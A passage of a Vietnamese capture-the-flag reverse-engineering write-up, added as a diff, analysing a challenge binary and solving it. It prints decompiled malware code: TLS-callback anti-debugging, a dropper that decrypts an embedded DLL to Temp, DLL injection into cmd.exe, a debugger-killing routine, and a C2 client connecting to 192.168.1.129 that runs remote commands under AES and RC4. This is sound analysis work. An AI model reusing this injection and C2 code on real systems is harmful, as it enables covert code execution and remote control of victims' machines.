@@ -2388,6 +2388,553 @@ int main() {
 ![image](https://github.com/user-attachments/assets/424a862e-ef54-42aa-88f3-73a791a96b5d)
 
 ## Detailed Analysis
+- Với những bài hard, thì khả năng cao sẽ có anti debug, như một thói quen thì mình sẽ check cửa sổ `exports` để check có hàm `TlsCallBack` hay không. Và như dự đoán, linh cảm của mình đã đúng
+
+- Hàm `TlsCallback_0` (mình sẽ để asm thay vì pseudocode vì instruction `DebugBreak` làm ảnh hưởng tới pseudocode được gen ra)
+
+![image](https://github.com/user-attachments/assets/a18922e2-6abb-4aa1-bc5b-5c9347651753)
+
+- Ta có thể thấy rằng hàm này thực hiện anti debug bằng cách gọi hàm `IsDebuggerPresent` và `DebugBreak` (Software Breakpoint để khi debugger step qua instruction này thì sẽ raise exception), luồng chuẩn của chúng ta sẽ là 2 hàm được gọi bên dưới kia
+
+- Hàm `sub_7FF638FF1250`
+```C
+int sub_7FF638FF1250()
+{
+  HRSRC ResourceW; // rax
+  signed int v1; // edx
+  __int64 v2; // rcx
+  __m128 v3; // xmm0
+  __m128 v4; // xmm1
+  __int64 v5; // rax
+  HMODULE ModuleHandleW; // rdi
+  HRSRC v7; // rsi
+  size_t v8; // rbx
+  HRSRC v9; // r14
+  char *v10; // rdi
+  unsigned int v11; // r9d
+  char *v12; // rcx
+  __int64 v13; // rax
+  __int128 v15; // [rsp+10h] [rbp-F0h]
+  FILE *Stream; // [rsp+20h] [rbp-E0h] BYREF
+  DWORD Stream_8; // [rsp+28h] [rbp-D8h] BYREF
+  char Format[16]; // [rsp+30h] [rbp-D0h] BYREF
+  int v19; // [rsp+40h] [rbp-C0h]
+  int v20; // [rsp+44h] [rbp-BCh]
+  int v21; // [rsp+48h] [rbp-B8h]
+  int v22; // [rsp+4Ch] [rbp-B4h]
+  int v23; // [rsp+50h] [rbp-B0h]
+  int v24; // [rsp+54h] [rbp-ACh]
+  char Buffer[256]; // [rsp+60h] [rbp-A0h] BYREF
+
+  *(_DWORD *)Format = 0x5A8D39D3;
+  *(_DWORD *)&Format[4] = 0x9D5DB16E;
+  *(_DWORD *)&Format[8] = 0x65FC17D7;
+  *(_DWORD *)&Format[0xC] = 0xB97C17DA;
+  v19 = 0x4B8F2CC8;
+  v20 = 0x3598DA68;
+  v21 = 0xF882F503;
+  v22 = 0x8CC789FB;
+  v23 = 0x9D8E9FA3;
+  v24 = 0xD04829;
+  Stream_8 = 0x100;
+  LODWORD(ResourceW) = GetUserNameA(Buffer, &Stream_8);
+  if ( (_DWORD)ResourceW )
+  {
+    v1 = 0;
+    v2 = 0i64;
+    do
+    {
+      v3 = (__m128)_mm_loadu_si128((const __m128i *)&Format[v2]);
+      v1 += 0x20;
+      v4 = (__m128)_mm_loadu_si128((const __m128i *)&byte_7FF638FF34C0[v2]);
+      v5 = v1;
+      v2 += 0x20i64;                            // Temp dir being generated here
+      *(__int128 *)((char *)&v15 + v2) = (__int128)_mm_xor_ps(v4, v3);
+      *(__m128 *)((char *)&Stream + v2) = _mm_xor_ps(
+                                            (__m128)_mm_loadu_si128((const __m128i *)&cp[v2]),
+                                            (__m128)_mm_loadu_si128((const __m128i *)((char *)&Stream + v2)));
+    }
+    while ( (unsigned __int64)v1 < 0x20 );
+    if ( (unsigned __int64)v1 < 0x28 )
+    {
+      do
+      {
+        ++v1;
+        Format[v5] ^= byte_7FF638FF34C0[v5];    // Evil.dll
+        ++v5;
+      }
+      while ( (unsigned int)v1 < 0x28 );
+    }
+    sub_7FF638FF1010(FileName, 0x104ui64, Format);
+    ModuleHandleW = GetModuleHandleW(0i64);
+    ResourceW = FindResourceW(ModuleHandleW, (LPCWSTR)0x65, L"BIN");
+    v7 = ResourceW;
+    if ( ResourceW )
+    {
+      LODWORD(ResourceW) = SizeofResource(ModuleHandleW, ResourceW);
+      v8 = (unsigned int)ResourceW;
+      if ( (_DWORD)ResourceW )
+      {
+        ResourceW = (HRSRC)LoadResource(ModuleHandleW, v7);
+        if ( ResourceW )
+        {
+          ResourceW = (HRSRC)LockResource(ResourceW);
+          v9 = ResourceW;
+          if ( ResourceW )
+          {
+            v10 = (char *)operator new((unsigned int)v8);
+            memcpy(v10, v9, (unsigned int)v8);
+            v11 = 0;
+            if ( (_DWORD)v8 )
+            {
+              v12 = v10;
+              do
+              {
+                ++v12;
+                v13 = v11++ & 0x1F;
+                v12[0xFFFFFFFF] ^= byte_7FF638FF34C0[v13 + 0x28];// Decrypt resource (PE File)
+              }
+              while ( v11 < (unsigned int)v8 );
+            }
+            Stream = 0i64;
+            LODWORD(ResourceW) = fopen_s(&Stream, FileName, "wb");
+            if ( Stream )
+            {
+              fwrite(v10, 1ui64, v8, Stream);
+              LODWORD(ResourceW) = fclose(Stream);
+            }
+          }
+        }
+      }
+    }
+  }
+  return (int)ResourceW;
+}
+```
+- Hàm này có nhiệm vụ lấy địa chỉ của thư mục `Temp` trên thiết bị của user, sau đó load resource có sẵn trong binary và tiến hành dùng xor để decrypt resource này thành 1 dll (PE File)
+
+- Hàm `sub_7FF638FF1070`
+```C
+int sub_7FF638FF1070()
+{
+  HMODULE ModuleHandleW; // rax
+  HMODULE (__stdcall *LoadLibraryA)(LPCSTR); // rsi
+  HANDLE Toolhelp32Snapshot; // rbx
+  __int64 v3; // rax
+  char v4; // cl
+  DWORD th32ProcessID; // r8d
+  HANDLE RemoteThread; // rax
+  void *v7; // rbx
+  void *v8; // rdi
+  void *v9; // rdi
+  size_t PtNumOfCharConverted[2]; // [rsp+40h] [rbp-378h] BYREF
+  PROCESSENTRY32W pe; // [rsp+50h] [rbp-368h] BYREF
+  char Dst[272]; // [rsp+290h] [rbp-128h] BYREF
+
+  ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
+  LoadLibraryA = (HMODULE (__stdcall *)(LPCSTR))GetProcAddress(ModuleHandleW, "LoadLibraryA");
+  pe.dwSize = 0x238;
+  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
+  if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
+  {
+    do
+    {
+      PtNumOfCharConverted[0] = 0i64;
+      wcstombs_s(PtNumOfCharConverted, Dst, 0x104ui64, pe.szExeFile, 0xFFFFFFFFFFFFFFFFui64);
+      v3 = 0i64;
+      while ( 1 )
+      {
+        v4 = Dst[v3++];
+        if ( v4 != aCmdExe[v3 - 1] )
+          break;
+        if ( v3 == 8 )
+        {
+          th32ProcessID = pe.th32ProcessID;
+          goto LABEL_8;
+        }
+      }
+    }
+    while ( Process32NextW(Toolhelp32Snapshot, &pe) );
+  }
+  CloseHandle(Toolhelp32Snapshot);
+  th32ProcessID = 0;
+LABEL_8:
+  RemoteThread = OpenProcess(0x43Au, 0, th32ProcessID);
+  v7 = RemoteThread;
+  if ( RemoteThread )
+  {
+    RemoteThread = VirtualAllocEx(RemoteThread, 0i64, 0x104ui64, 0x3000u, 0x40u);
+    v8 = RemoteThread;
+    if ( RemoteThread )
+    {
+      LODWORD(RemoteThread) = WriteProcessMemory(v7, RemoteThread, FileName, 0x104ui64, 0i64);
+      if ( (_DWORD)RemoteThread )
+      {
+        RemoteThread = CreateRemoteThread(v7, 0i64, 0i64, (LPTHREAD_START_ROUTINE)LoadLibraryA, v8, 0, 0i64);
+        v9 = RemoteThread;
+        if ( RemoteThread )
+        {
+          WaitForSingleObject(RemoteThread, 0xFFFFFFFF);
+          CloseHandle(v7);
+          CloseHandle(v9);
+          remove(FileName);
+          ExitProcess(0);
+        }
+      }
+    }
+  }
+  return (int)RemoteThread;
+}
+```
+- Hàm này sẽ tiến hành enumerate snapshot để tìm tiến trình `cmd.exe`, sau đó sử dụng kĩ thuật `DLL Injection` để inject dll đã được đề cập ở trên vào trong process này, sau khi process này thực thi xong thì file dll này sẽ bị xóa đi
+
+- Quay trở lại hàm `main` phân tích
+```C
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  SOCKET v3; // rsi
+  unsigned int v4; // eax
+  unsigned int v5; // ebx
+  char *v6; // rdi
+  char *v7; // rdx
+  int v8; // r8d
+  int v9; // eax
+  __int64 v10; // rdx
+  __int64 v11; // rcx
+  int v12; // ebx
+  struct sockaddr name; // [rsp+20h] [rbp-5F8h] BYREF
+  struct WSAData WSAData; // [rsp+30h] [rbp-5E8h] BYREF
+  char buf[48]; // [rsp+1D0h] [rbp-448h] BYREF
+  char v17[1024]; // [rsp+200h] [rbp-418h] BYREF
+
+  if ( !WSAStartup(0x202u, &WSAData) )
+  {
+    v3 = socket(2, 1, 0);
+    if ( v3 != 0xFFFFFFFFFFFFFFFFui64 )
+    {
+      name.sa_family = 2;
+      *(_DWORD *)&name.sa_data[2] = inet_addr("192.168.1.129");
+      *(_WORD *)name.sa_data = htons(13337u);
+      if ( connect(v3, &name, 0x10) != 0xFFFFFFFF )
+      {
+        v4 = time64(0i64);
+        srand(v4);
+        v5 = 0;
+        v6 = buf;
+        do
+        {
+          ++v5;
+          *v6++ = rand();
+        }
+        while ( v5 < 0x30 );
+        v7 = buf;
+        v8 = 0x30;
+LABEL_7:
+        send(v3, v7, v8, 0);
+        do
+        {
+          v9 = recv(v3, v17, 0x400, 0);
+          v12 = v9;
+          if ( v9 > 0 )
+          {
+            if ( (unsigned __int64)v9 >= 0x400 )
+              sub_7FF638FF19D8(v11, v10, v9);
+            v17[v9] = 0;
+            sub_7FF638FF1500((__int64)buf, v17, v9);
+            v8 = v12;
+            v7 = v17;
+            goto LABEL_7;
+          }
+        }
+        while ( v9 );
+        closesocket(v3);
+        WSACleanup();
+      }
+    }
+  }
+  return 1;
+}
+```
+- Hàm này thực hiện kết nối đến `192.168.1.129` với port là `13337`, tiếp đến là gọi `srand` và `rand` và gửi chỗ data được gen đó đi, sau đó nhận data từ phía C2, đưa chỗ data đó vào hàm `sub_7FF638FF1500` (RC4 Encrypt/Decrypt) để xử lý
+
+- Bây giờ ta sẽ chuyển sang phân tích file `Evil.dll`
+
+![image](https://github.com/user-attachments/assets/4bb3495b-a497-4f76-a36f-c3d57d167865)
+
+- Tại hàm `sub_180001950` có tạo ra một thread chạy 1 routine rất khả nghi
+
+```C
+__int64 __fastcall sub_180001950(__int64 a1, int a2)
+{
+  if ( a2 == 1 )
+    CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)StartAddress, 0i64, 0, 0i64);
+  return 1i64;
+}
+```
+- Hàm `StartAddress`
+```C
+DWORD __fastcall StartAddress(LPVOID lpThreadParameter)
+{
+  HANDLE Toolhelp32Snapshot; // rdi
+  unsigned int v2; // esi
+  char *v3; // r9
+  HANDLE v4; // rax
+  void *v5; // rbx
+  DWORD CurrentProcessId; // eax
+  HANDLE v7; // rax
+  void *v8; // rbx
+  SOCKET v9; // rax
+  SOCKET v10; // rdi
+  UCHAR *v11; // rbx
+  int v12; // eax
+  int v13; // eax
+  size_t PtNumOfCharConverted; // [rsp+30h] [rbp-D0h] BYREF
+  struct sockaddr name; // [rsp+38h] [rbp-C8h] BYREF
+  PROCESSENTRY32W pe; // [rsp+50h] [rbp-B0h] BYREF
+  __int64 v18[8]; // [rsp+290h] [rbp+190h] BYREF
+  char v19[32]; // [rsp+2D0h] [rbp+1D0h] BYREF
+  UCHAR pbSecret[48]; // [rsp+2F0h] [rbp+1F0h] BYREF
+  char Dst[272]; // [rsp+320h] [rbp+220h] BYREF
+  char v22[1024]; // [rsp+430h] [rbp+330h] BYREF
+  char buf[1024]; // [rsp+830h] [rbp+730h] BYREF
+
+  pe.dwSize = 568;
+  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
+  v2 = 0;
+  if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
+  {
+    do
+    {
+      PtNumOfCharConverted = 0i64;
+      wcstombs_s(&PtNumOfCharConverted, Dst, 0x104ui64, pe.szExeFile, 0xFFFFFFFFFFFFFFFFui64);
+      v18[0] = (__int64)"ollydbg.exe";
+      v18[5] = (__int64)"windbg.exe";
+      v3 = (char *)v18;
+      v18[1] = (__int64)"x64dbg.exe";
+      v18[6] = (__int64)"dbgview.exe";
+      v18[7] = (__int64)"immunitydbg.exe";
+      v18[2] = (__int64)"idaq.exe";
+      v18[3] = (__int64)"ida64.exe";
+      v18[4] = (__int64)"ida.exe";
+      while ( strcmp(Dst, *(const char **)v3) )
+      {
+        v3 += 8;
+        if ( v3 == v19 )
+          goto LABEL_10;
+      }
+      v4 = OpenProcess(1u, 0, pe.th32ProcessID);
+      v5 = v4;
+      if ( v4 )
+      {
+        TerminateProcess(v4, 1u);
+        CloseHandle(v5);
+      }
+      CurrentProcessId = GetCurrentProcessId();
+      v7 = OpenProcess(1u, 0, CurrentProcessId);
+      v8 = v7;
+      if ( v7 )
+      {
+        TerminateProcess(v7, 1u);
+        CloseHandle(v8);
+      }
+LABEL_10:
+      ;
+    }
+    while ( Process32NextW(Toolhelp32Snapshot, &pe) );
+  }
+  CloseHandle(Toolhelp32Snapshot);
+  LODWORD(v9) = WSAStartup(0x202u, (LPWSADATA)&pe);
+  if ( !(_DWORD)v9 )
+  {
+    v9 = socket(2, 1, 0);
+    v10 = v9;
+    if ( v9 != -1i64 )
+    {
+      name.sa_family = 2;
+      *(_DWORD *)&name.sa_data[2] = inet_addr("192.168.1.129");
+      *(_WORD *)name.sa_data = htons(0x3419u);
+      LODWORD(v9) = connect(v10, &name, 16);
+      if ( (_DWORD)v9 != -1 )
+      {
+        LODWORD(PtNumOfCharConverted) = time64(0i64);
+        srand(PtNumOfCharConverted);
+        v11 = pbSecret;
+        do
+        {
+          ++v2;
+          *v11++ = rand();
+        }
+        while ( v2 < 0x30 );
+        send(v10, (const char *)&PtNumOfCharConverted, 4, 0);
+        v12 = recv(v10, buf, 1024, 0);
+        sub_180001200(pbSecret, (PUCHAR)buf, v12, v19);
+        do
+        {
+          while ( 1 )
+          {
+            v13 = recv(v10, v22, 1024, 0);
+            if ( v13 <= 0 )
+              break;
+            if ( (unsigned __int64)v13 >= 0x400 )
+              sub_180001AC8();
+            v22[v13] = 0;
+            sub_180001000(v19, v22);
+            sub_180001460(v10, v22, v19);
+          }
+        }
+        while ( v13 );
+        closesocket(v10);
+        LODWORD(v9) = WSACleanup();
+      }
+    }
+  }
+  return v9;
+}
+```
+- Hàm này sẽ kiểm tra tên tiến trình đang chạy nó, nếu như tên của chúng là các disassembler hay debugger cơ bản như IDA, x64dbg,...etc thì chương trình sẽ tắt tiến trình đó, tiếp đến ta có thể thấy rằng chức năng của hàm này cũng tương tự như hàm `main` ở bên trên, thêm hàm `sub_180001200` thực hiện mã hóa AES với mode là CBC và hàm `sub_180001460` thực hiện chạy remote payload và mã hóa output bằng RC4. Vậy biết thuật toán mã hóa, những thứ ta cần phải tìm sẽ là như sau
+	+ Thứ nhất sẽ là key,iv và cyphertext cho AES
+ 	+ Thứ 2 sẽ là key cho RC4
+
+
+![image](https://github.com/user-attachments/assets/aa917f37-1c55-48f5-a12b-f191a340b66c)
+
+- Bài cũng cho ta 1 file pcapng để ta có thể kiểm tra tcp stream giữa 2 tiến trình exe và dll, với dữ kiện là dll sẽ gửi data đi đầu tiên, ta có thể suy ra rằng đây sẽ là seed để khởi tạo ra key và iv cho quá trình mã hóa. Ta có thể dễ dàng mô phỏng lại với script như bên dưới
+
+
+```C
+#include <stdio.h>
+#include <time.h>
+#include <stdlib.h>
+int main(){
+    unsigned int seed = 0x674f4b38; 
+    srand(seed);
+    for(int i=0; i<48; i++){
+        int key_iv = rand() & 0xFF;
+        printf("0x%X, ", key_iv);     
+    }
+    return 0;
+}
+```
+- Sau đó thì là response có số byte là 32 (bội của 16), nên ta có thể phỏng đoán rằng đây sẽ là cyphertext cho AES, với các dữ kiện trên, mình có viết 1 script decrypt
+
+```C
+#include <windows.h>
+#include <bcrypt.h>
+#include <stdio.h>
+
+#pragma comment(lib, "bcrypt.lib")
+
+int EncryptData(PUCHAR pbSecret, PUCHAR pbInput, ULONG cbInput, void* outputBuffer, ULONG* outputSize) {
+    BCRYPT_ALG_HANDLE phAlgorithm = NULL;
+    BCRYPT_KEY_HANDLE phKey = NULL;
+    ULONG cbOutput = 0, pcbResult = 0;
+    UCHAR pbOutput[4] = { 0 };
+    UCHAR* keyObject = NULL;
+    void* encryptedData = NULL;
+    int status = -1;
+
+    // Open AES algorithm provider
+    if (BCryptOpenAlgorithmProvider(&phAlgorithm, L"AES", NULL, 0) != 0) {
+        fprintf(stderr, "Failed to open algorithm provider\n");
+        return -1;
+    }
+
+    // Get the size of the key object
+    if (BCryptGetProperty(phAlgorithm, L"ObjectLength", pbOutput, sizeof(pbOutput), &pcbResult, 0) != 0) {
+        fprintf(stderr, "Failed to get key object size\n");
+        goto cleanup;
+    }
+
+    ULONG keyObjectSize = *(ULONG*)pbOutput;
+
+    // Allocate memory for the key object
+    keyObject = (UCHAR*)HeapAlloc(GetProcessHeap(), 0, keyObjectSize);
+    if (!keyObject) {
+        fprintf(stderr, "Failed to allocate memory for key object\n");
+        goto cleanup;
+    }
+
+    // Generate symmetric key
+    if (BCryptGenerateSymmetricKey(phAlgorithm, &phKey, keyObject, keyObjectSize, pbSecret, 32, 0) != 0) {
+        fprintf(stderr, "Failed to generate symmetric key\n");
+        goto cleanup;
+    }
+
+    PUCHAR pbIV = pbSecret + 32; // Initialization vector (16 bytes)
+
+    // Determine the size of the encrypted data
+    if (BCryptDecrypt(phKey, pbInput, cbInput, NULL, pbIV, 16, NULL, 0, &cbOutput, 0) != 0) {
+        fprintf(stderr, "Failed to get encrypted data size\n");
+        goto cleanup;
+    }
+
+    // Allocate memory for the encrypted data
+    encryptedData = HeapAlloc(GetProcessHeap(), 0, cbOutput);
+    if (!encryptedData) {
+        fprintf(stderr, "Failed to allocate memory for encrypted data\n");
+        goto cleanup;
+    }
+
+    // Perform the encryption
+    if (BCryptDecrypt(phKey, pbInput, cbInput, NULL, pbIV, 16, (PUCHAR)encryptedData, cbOutput, &cbOutput, 0) != 0) {
+        fprintf(stderr, "Failed to encrypt data\n");
+        goto cleanup;
+    }
+
+    // Copy encrypted data to the output buffer
+    memcpy(outputBuffer, encryptedData, cbOutput);
+    *outputSize = cbOutput;
+    status = 0;
+
+cleanup:
+    if (encryptedData) {
+        HeapFree(GetProcessHeap(), 0, encryptedData);
+    }
+    if (keyObject) {
+        HeapFree(GetProcessHeap(), 0, keyObject);
+    }
+    if (phKey) {
+        BCryptDestroyKey(phKey);
+    }
+    if (phAlgorithm) {
+        BCryptCloseAlgorithmProvider(phAlgorithm, 0);
+    }
+
+    return status;
+}
+
+int main() {
+
+    UCHAR secret[48] = { 0xDB, 0x9F, 0x47, 0xE5, 0xFF, 0xC2, 0x75, 0xD7, 0xF4, 0xC3, 0x17, 0x46, 0xE8, 0x67, 0xEC, 0xC5, 0xAF, 0x81, 0x8B, 0x60, 0xB9, 0x16, 0xF7, 0xDD, 0x41, 0xBF, 0x73, 0x41, 0xC8, 0x4F, 0x97, 0x96, 0xC2, 0xB6, 0xA4, 0xEC, 0x8F, 0x25, 0x15, 0x9E, 0xAC, 0x73, 0x76, 0xD6, 0x2B, 0xC0, 0x79, 0x53, };
+    UCHAR cyphertext[] = { 0xe8, 0xeb, 0x6b, 0x62, 0x8b, 0x44, 0x13, 0xb6,
+0xa7, 0x4c, 0x16, 0x97, 0x28, 0x50, 0xa3, 0xa6,
+0xe6, 0xd8, 0xbf, 0x5f, 0x70, 0x16, 0x21, 0xe2,
+0x88, 0x8b, 0x79, 0x8b, 0x0e, 0xbd, 0x2d, 0x89 };
+    ULONG plainTextLength = sizeof(cyphertext);
+    UCHAR outputBuffer[1041] = { 0 };
+    ULONG outputSize = 0;
+
+    if (EncryptData(secret, cyphertext, plainTextLength, outputBuffer, &outputSize) == 0) {
+        printf("Encryption successful! Encrypted data size: %lu\n", outputSize);
+
+        for (int i = 0; i < sizeof(cyphertext); i++) {
+            printf("%c", outputBuffer[i]);
+        }
+    }
+    else {
+        printf("Encryption failed!\n");
+    }
+
+    return 0;
+}
+
+```
+- Ta thu được kết quả là `Th!s_1s_R34l_K3y_f0r_Rc4_D3crypt` và cũng chính là thứ cần tìm tiếp theo (RC4 key), bây giờ ta chỉ cần đem các packet còn lại đi decrypt với RC4 là xong
+
+![image](https://github.com/user-attachments/assets/6954b537-686c-425a-8177-cba56e62e2ee)
+
+![image](https://github.com/user-attachments/assets/955c135d-8f1b-4663-8569-793c22afc9f2)
+
 ## Script and Flag
 ```C
 #include <stdio.h>
